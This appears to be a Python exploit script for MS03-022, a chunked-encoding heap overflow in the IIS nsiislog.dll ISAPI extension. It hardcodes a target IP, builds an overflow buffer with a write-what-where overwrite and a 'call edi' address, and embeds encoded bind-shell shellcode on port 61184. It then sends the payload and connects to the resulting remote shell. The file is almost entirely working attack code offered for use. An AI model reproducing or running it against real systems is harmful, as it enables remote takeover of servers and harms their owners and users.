#!/usr/bin/env python
#
# Currently this version works only when ISAPI COM objects are configured to launch in
# a debugger from Component Policy option somewhere in Administrative Tools under Control
# panel. 
#	- I need to find a better way of debugging IIS ISAPI.
#	- This version uses a Windows 2000 SP independent call edi instruction to execute
#	  shellcode. So a [WHERE] pointer reliability should make this exploit reliable.
#
#
import sys
import socket
import os
import time

Description = """
MS03-022: nsiislog.dll Chunked Encoding Heap Overflow exploit
"""

def get_shellcode(nop=0):
	shellcode = '' 
	# win32_bind -  EXITFUNC=thread LPORT=61184 Size=344 Encoder=ShikataGaNai http://metasploit.com
	shellcode += "\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x69"
	shellcode += "\x41\xf0\x73\x83\xeb\xfc\xe2\xf4\x95\x2b\x1b\x3e\x81\xb8\x0f\x8c"
	shellcode += "\x96\x21\x7b\x1f\x4d\x65\x7b\x36\x55\xca\x8c\x76\x11\x40\x1f\xf8"
	shellcode += "\x26\x59\x7b\x2c\x49\x40\x1b\x3a\xe2\x75\x7b\x72\x87\x70\x30\xea"
	shellcode += "\xc5\xc5\x30\x07\x6e\x80\x3a\x7e\x68\x83\x1b\x87\x52\x15\xd4\x5b"
	shellcode += "\x1c\xa4\x7b\x2c\x4d\x40\x1b\x15\xe2\x4d\xbb\xf8\x36\x5d\xf1\x98"
	shellcode += "\x6a\x6d\x7b\xfa\x05\x65\xec\x12\xaa\x70\x2b\x17\xe2\x02\xc0\xf8"
	shellcode += "\x29\x4d\x7b\x03\x75\xec\x7b\x33\x61\x1f\x98\xfd\x27\x4f\x1c\x23"
	shellcode += "\x96\x97\x96\x20\x0f\x29\xc3\x41\x01\x36\x83\x41\x36\x15\x0f\xa3"
	shellcode += "\x01\x8a\x1d\x8f\x52\x11\x0f\xa5\x36\xc8\x15\x15\xe8\xac\xf8\x71"
	shellcode += "\x3c\x2b\xf2\x8c\xb9\x29\x29\x7a\x9c\xec\xa7\x8c\xbf\x12\xa3\x20"
	shellcode += "\x3a\x12\xb3\x20\x2a\x12\x0f\xa3\x0f\x29\x1f\x73\x0f\x12\x79\x92"
	shellcode += "\xfc\x29\x54\x69\x19\x86\xa7\x8c\xbf\x2b\xe0\x22\x3c\xbe\x20\x1b"
	shellcode += "\xcd\xec\xde\x9a\x3e\xbe\x26\x20\x3c\xbe\x20\x1b\x8c\x08\x76\x3a"
	shellcode += "\x3e\xbe\x26\x23\x3d\x15\xa5\x8c\xb9\xd2\x98\x94\x10\x87\x89\x24"
	shellcode += "\x96\x97\xa5\x8c\xb9\x27\x9a\x17\x0f\x29\x93\x1e\xe0\xa4\x9a\x23"
	shellcode += "\x30\x68\x3c\xfa\x8e\x2b\xb4\xfa\x8b\x70\x30\x80\xc3\xbf\xb2\x5e"
	shellcode += "\x97\x03\xdc\xe0\xe4\x3b\xc8\xd8\xc2\xea\x98\x01\x97\xf2\xe6\x8c"
	shellcode += "\x1c\x05\x0f\xa5\x32\x16\xa2\x22\x38\x10\x9a\x72\x38\x10\xa5\x22"
	shellcode += "\x96\x91\x98\xde\xb0\x44\x3e\x20\x96\x97\x9a\x8c\x96\x76\x0f\xa3"
	shellcode += "\xe2\x16\x0c\xf0\xad\x25\x0f\xa5\x3b\xbe\x20\x1b\x86\x8f\x10\x13"
	shellcode += "\x3a\xbe\x26\x8c\xb9\x41\xf0\x73"

	payload = '\x90' * nop
	payload += shellcode

	return payload

def exploit_main():
	host = '192.168.0.18'
	port = 80

	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	print '[+] Connecting to %s:%d' % (host,port)
	try:
		sock.connect((host,port))
	except socket.error:
		print '[-] Cannot connect'
		sys.exit(1)
	print '[+] Checking if nsiislog ISAPI is enabled'
	request = 'GET /scripts/nsiislog.dll HTTP/1.1\r\n'
	request += 'Host: %s:%d\r\n' % (host,port)
	request += '\r\n'
	sock.send(request)
	response = sock.recv(5000)
	if 'NetShow ISAPI' in response:
		print '[+] nsiislog ISAPI found'
	else:
		print '[-] nsiislog ISAPI not found'
		sys.exit(1)
	sock.close()
	
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	print '[+] Reconnecting to server for exploitation'
	try:
		sock.connect((host,port))
	except socket.error:
		print '[-] Cannot connect'
		sys.exit(1)
	
	request = ''
	request += 'POST /scripts/nsiislog.dll HTTP/1.1\r\n'
	request += 'Host: %s:%d\r\n' % (host,port)
	request += 'Transfer-Encoding: chunked\r\n\r\n'
	
	# Pwn'ing buffer - Official Guide to unEthical Pwning
	pwn = ''
	#
	# Our buffer looks like this:
	# [A*0x18][JmpShort][A*6][CALL EDI ADDR][FUNCTION POINTER][SHELLCODE]
	# We get an arbitray 4 byte memory overwrite at:
	# 77F9012A   8901             MOV DWORD PTR DS:[ECX],EAX
	# 77F9012C   8948 04          MOV DWORD PTR DS:[EAX+4],ECX
	# 
	#	EDI = pwn buffer
	#	EAX = Shellcode Address [EDI points to our buffer]
	#	ECX = Function Pointer
	#
	pwn += 'A' * 0x18		# EDI = pwn + 0x18
	pwn += '\xeb\x0e' + 'A' * 6	# JMP +0x0e
	# We can have 0x00 in our buffer since we are using chunked encoding
	# TODO: What 	= call edi
	#	Where	= SEH Pointer
	#	RtlEnterCriticalSection = 0x7FFDF020
	#	
	
	# Windows 2000 SP Indenpendent call edi @ ws2help.dll
	pwn += '\x21\x14\x02\x75'	# EAX = EDI + 0x08			[WHAT]
	pwn += '\x44\xd6\xb0\x00' 	# ECX = EDI + 0x0C			[WHERE]
	pwn += get_shellcode(nop=0)	# Assembly Component
	pwn += 'A' * (65535-len(pwn))	# RtlAllocateHeap internals! The thin red line seperating theory and practise
	##
	
	request += '%d\r\n%s\r\n0\r\n\r\n' % (len(pwn),pwn)

	print '[+] Request len: %d' % len(request)
	sock.send(request)
	buf = sock.recv(1024)
	print '[+] Response len: %d' % len(buf)

	print '[+] Sleeping 3 seconds before connecting to shell'
	time.sleep(3)
	print '[+] Connecting to Shell'
	Connector.InterectShell(host,61184)

if __name__ == '__main__':
	exploit_main()
